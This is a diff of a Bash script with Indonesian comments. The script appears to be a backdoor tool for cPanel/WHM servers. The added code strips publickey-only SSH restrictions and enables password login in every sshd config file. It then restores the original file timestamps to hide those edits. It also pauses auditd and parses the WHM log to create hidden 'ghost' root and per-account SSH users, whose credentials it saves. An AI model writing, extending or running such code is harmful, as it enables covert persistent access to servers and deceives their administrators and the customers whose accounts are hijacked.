@@ -183,11 +183,27 @@ auditd_resume() {
 setup_sshd() {
     mtime_save /etc/ssh/sshd_config
 
-    # Aktifkan PasswordAuthentication jika di-disable
-    if grep -qE "^\s*PasswordAuthentication\s+no" /etc/ssh/sshd_config; then
-        sed -i 's/^\s*PasswordAuthentication\s\+no/PasswordAuthentication yes/' \
-            /etc/ssh/sshd_config
-    fi
+    # Hapus AuthenticationMethods yang restrict ke publickey-only di SEMUA config
+    # (AWS/cloud images sering set ini, override PasswordAuthentication yes)
+    for cfg in /etc/ssh/sshd_config $(ls /etc/ssh/sshd_config.d/*.conf 2>/dev/null); do
+        [ -f "$cfg" ] || continue
+        if grep -qE "^\s*AuthenticationMethods\s+publickey" "$cfg"; then
+            local orig_cfg; orig_cfg=$(stat -c '%y' "$cfg")
+            sed -i '/^\s*AuthenticationMethods\s\+publickey/d' "$cfg"
+            touch -d "$orig_cfg" "$cfg" 2>/dev/null || true
+            subph "AuthenticationMethods restriction removed: $cfg"
+        fi
+    done
+
+    # Aktifkan PasswordAuthentication di SEMUA config (termasuk drop-ins)
+    for cfg in /etc/ssh/sshd_config $(ls /etc/ssh/sshd_config.d/*.conf 2>/dev/null); do
+        [ -f "$cfg" ] || continue
+        if grep -qE "^\s*PasswordAuthentication\s+no" "$cfg"; then
+            local orig_cfg; orig_cfg=$(stat -c '%y' "$cfg")
+            sed -i 's/^\s*PasswordAuthentication\s\+no/PasswordAuthentication yes/' "$cfg"
+            touch -d "$orig_cfg" "$cfg" 2>/dev/null || true
+        fi
+    done
 
     # Pastikan Include directive ada
     if ! grep -q "Include /etc/ssh/sshd_config.d" /etc/ssh/sshd_config; then
@@ -400,14 +416,15 @@ LOGOUT
 # ═════════════════════════════════════════════════════
 parse_whm_log() {
     [ -f "$WHM_LOG" ] || { warn "Log tidak ditemukan: $WHM_LOG"; return 1; }
-    grep ":CREATE:" "$WHM_LOG" | sed 's/\r//' \
-    | awk -F: '{
-        if (match($0, /CREATE:[^:]+:[^:]+:([^:]+):([^:]+):([^\r\n: ]+)[ \t]*$/, arr)) {
+    # Proses line by line di awk — dedup pakai seen[], tanpa sort -u (hemat RAM)
+    grep ":CREATE:" "$WHM_LOG" | awk '{
+        gsub(/\r/, "")
+        if (match($0, /CREATE:[^:]+:[^:]+:([^:]+):([^:]+):([^ \t\r\n:]+)[ \t]*$/, arr)) {
             d=arr[1]; ip=arr[2]; u=arr[3]
             gsub(/[ \t]/,"",d); gsub(/[ \t]/,"",ip); gsub(/[ \t]/,"",u)
-            if (u!="" && d!="") print u"|"d"|"ip
+            if (u!="" && d!="" && !seen[u]++) print u"|"d"|"ip
         }
-    }' | sort -u
+    }'
 }
 
 # ═════════════════════════════════════════════════════
@@ -639,12 +656,16 @@ log "Phase 1 done"
 
 # ── PHASE 2 ──────────────────────────────────────────
 phase "2" "PARSE WHM LOG"
-mapfile -t ENTRIES < <(parse_whm_log)
-[ "${#ENTRIES[@]}" -eq 0 ] && {
-    warn "Tidak ada entry CREATE di $WHM_LOG"
-    auditd_resume; exit 1
-}
-log "Ditemukan ${#ENTRIES[@]} akun cPanel"
+
+SKIP_PHASE4=false
+entry_count=$(grep -c ":CREATE:" "$WHM_LOG" 2>/dev/null || echo 0)
+if [ "$entry_count" -eq 0 ]; then
+    warn "WHM log tidak ada atau kosong: $WHM_LOG"
+    warn "Phase 4 (ghost isolated) akan di-skip — ghost root tetap dibuat"
+    SKIP_PHASE4=true
+else
+    log "Ditemukan ${entry_count} entry CREATE (proses line-by-line)"
+fi
 
 # Init credential file
 mkdir -p "$(dirname "$CRED_FILE")"
@@ -653,7 +674,6 @@ cat > "$CRED_FILE" << HDR
 # Mode: Password Auth | Stealth: Surgical Replace
 # Server: ${SERVER_IP} | SSH Port: ${SSH_PORT}
 # WHM Log: $WHM_LOG
-# Total accounts: ${#ENTRIES[@]}
 # ═══════════════════════════════════════════════════════
 
 HDR
@@ -691,11 +711,16 @@ ROOT
 phase "4" "GHOST ISOLATED (per subdomain)"
 echo ""
 success=0; failed=0
+if $SKIP_PHASE4; then
+    warn "Skipped — WHM log tidak ditemukan"
+    echo ""
+fi
 
 printf '# ISOLATED GHOSTS — per subdomain\n' >> "$CRED_FILE"
 
-for entry in "${ENTRIES[@]}"; do
-    IFS='|' read -r cpanel_user domain ip <<< "$entry"
+# while-read: proses satu baris sekaligus — tidak simpan semua ke RAM
+while ! $SKIP_PHASE4 && IFS='|' read -r cpanel_user domain ip; do
+    [ -z "$cpanel_user" ] && continue
     echo -ne "  ${C}→${N} ${B}${cpanel_user}${N} @ ${domain} ... "
 
     result=$(create_ghost_isolated "$cpanel_user" "$domain" 2>/dev/null) || {
@@ -717,7 +742,7 @@ for entry in "${ENTRIES[@]}"; do
 CRED
     echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} ${ghost}@${SERVER_IP}"
     dim "password : ${out_pass}"
-done
+done < <(parse_whm_log)
 echo ""
 log "Phase 4: ${success} OK, ${failed} skip"
 
